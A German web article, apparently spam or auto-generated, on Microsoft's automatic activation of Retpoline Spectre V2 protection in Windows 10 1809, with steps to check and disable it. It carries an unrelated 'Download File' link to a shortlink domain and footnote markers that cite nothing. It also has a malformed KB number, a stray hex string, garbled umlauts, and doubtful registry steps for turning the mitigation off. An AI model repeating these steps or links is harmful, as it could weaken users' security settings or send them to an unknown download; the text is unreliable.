## Windows 10 V1809: Retpoline automatisch aktiviert

  
# Windows 10 V1809: Retpoline automatisch aktiviert
 
Microsoft hat zum 14. Mai 2019 den Schutz gegen Spectre V2 durch die Retpoline-Compilertechnologie im Kernel automatisch fÃ¼r Windows 10 Version 1809 und Windows Server 2019 aktiviert. Was ist Retpoline und warum ist es wichtig?
 
## Windows 10 V1809: Retpoline automatisch aktiviert


[**Download File**](https://www.google.com/url?q=https%3A%2F%2Fbltlly.com%2F2tKzBH&sa=D&sntz=1&usg=AOvVaw2GqpelAkuurYCd50Bqy50j)

 
## Was ist Retpoline?
 
Retpoline (Return Trampoline) ist eine von Google entwickelte Compiler-Technologie, um ausfÃ¼hrbaren Code gegen Seitenkanalangriffe (Spectre) per branch-target-injection zu schÃ¼tzen. GegenÃ¼ber Microcode-Updates, die zu einer LeistungseinbuÃe fÃ¼hren und nur prozessorspezifisch angeboten werden kÃ¶nnen, vermeidet Retpoline als Compiler-Technologie diese LeistungseinbuÃen. Im Linux-Kernel ist diese Technologie lÃ¤ngst Ã¼bernommen.
 
## Wie wurde Retpoline in Windows 10 eingefÃ¼hrt?
 
Im MÃ¤rz 2019 kam die Kunde von Microsoft, dass man Retpoline auch in Windows 10 Ã¼bernehme. Die damalige Aussage: Ab Windows 10 19H1 kommt Retpoline im Windows-Kernel als Schutz gegen Spectre V2-Angriffe zum Einsatz. Im Herbst 2018 hatte Microsoft bereits angekÃ¼ndigt, einen Retpoline-Backport fÃ¼r Ã¤ltere Windows 10-Versionen vorzunehmen.
 
Mit dem am 1. MÃ¤rz 2019 verÃ¶ffentlichten Update KB44828887 fÃ¼r Windows 10 Version 1809 wurde Retpoline fÃ¼r diese Windows-Version eingefÃ¼hrt. Der Retpoline-Schutz war aber nicht aktiviert. Man musste ggf. RegistrierungseintrÃ¤ge setzen, um diesen Schutz im Kernel zu aktivieren.
 
## Wie wurde Retpoline automatisch aktiviert?
 
Mit dem Update KB4494441 vom 14. Mai 2019 hat Microsoft den Retpoline-Schutz automatisch fÃ¼r alle unterstÃ¼tzten GerÃ¤te aktiviert, die folgende Bedingungen erfÃ¼llen:
 
- Spectre, Variant 2 (CVE-2017-5715) Mitigation ist eingeschaltet.
- UnterstÃ¼tzte Microcode/Firmware-Updates sind auf der Maschine angewendet.

Auf Skylake und spÃ¤teren Generationen von Intel-Prozessoren wird laut Microsoft nur die Import-Optimierung aktiviert. Dies ist eine spezielle Technik von Microsoft, die den Overhead bei Kernel-Aufrufen minimieren soll.
 
## Wie kann man Ã¼berprÃ¼fen, ob Retpoline aktiv ist?
 
Um zu Ã¼berprÃ¼fen, ob Retpoline auf einem GerÃ¤t aktiv ist, kann man folgende Schritte ausfÃ¼hren:

1. Ãffnen Sie eine Eingabeaufforderung mit Administratorrechten.
2. Geben Sie den Befehl `wmic qfe list brief /format:table` ein und drÃ¼cken Sie die Eingabetaste.
3. Suchen Sie nach dem Update KB4494441 in der Liste der installierten Updates.
4. Geben Sie den Befehl `powershell Get-SpeculationControlSettings` ein und drÃ¼cken Sie die Eingabetaste.
5. Unter der Rubrik \"BTIKernelRetpolineEnabled\" sollte \"True\" stehen, wenn Retpoline aktiv ist.

Weitere Informationen zu Retpoline finden Sie in diesem Artikel von Microsoft[^1^].
  
## Welche Vorteile hat Retpoline?
 
Retpoline hat die Leistung der Spectre-Variante-2-Minderungen unter Windows deutlich verbessert. Wenn alle relevanten Kernel-Mode-BinÃ¤rdateien mit Retpoline kompiliert sind, hat Microsoft eine ~25%ige Beschleunigung der Office-App-Startzeiten und bis zu 1,5-2x verbesserten Durchsatz in den Diskspd (Speicher) und NTttcp (Netzwerk) Benchmarks auf Broadwell-CPUs im Vergleich zu den vorherigen Microcode-basierten Minderungen gemessen[^1^].
 
Retpoline kann auch die Sicherheit von Windows erhÃ¶hen, indem es die AngriffsflÃ¤che fÃ¼r Seitenkanalangriffe reduziert. Da Retpoline eine Compiler-Technologie ist, kann sie unabhÃ¤ngig von der Prozessorarchitektur oder -generation angewendet werden, solange sie kompatibel ist. Retpoline kann auch mit anderen Sicherheitsfunktionen wie Kernel Address Space Layout Randomization (KASLR) oder Control Flow Guard (CFG) kombiniert werden.
 
## Wie kann man Retpoline deaktivieren?
 
Falls Retpoline Probleme verursacht oder nicht gewÃ¼nscht ist, kann man es manuell deaktivieren, indem man die folgenden RegistrierungseintrÃ¤ge lÃ¶scht oder Ã¤ndert:

1. Ãffnen Sie den Registrierungseditor mit Administratorrechten.
2. Navigieren Sie zu dem SchlÃ¼ssel `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management`.
3. LÃ¶schen Sie den Wert `FeatureSettingsOverride` oder setzen Sie ihn auf `0`.
4. LÃ¶schen Sie den Wert `FeatureSettingsOverrideMask` oder setzen Sie ihn auf `0`.
5. Starten Sie das GerÃ¤t neu.

Weitere Informationen zur Deaktivierung von Retpoline finden Sie in diesem Artikel von Microsoft[^1^].
 0f148eb4a0
